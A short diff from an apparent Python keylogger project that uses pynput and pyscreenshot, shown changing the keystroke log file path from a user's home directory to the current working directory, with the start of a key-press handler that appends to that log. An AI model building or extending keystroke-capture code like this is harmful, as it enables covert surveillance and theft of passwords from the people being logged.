@@ -3,7 +3,7 @@ from pynput import keyboard
 import pyscreenshot as ImageGrab
 import time, datetime, sys, os
 
-LOG_FILE = '/home/vpatel95/keylogger/keys.log'
+LOG_FILE = os.getcwd() + '/keys.log'
 
 def keyPress(key):
     with open(LOG_FILE,'a') as f:
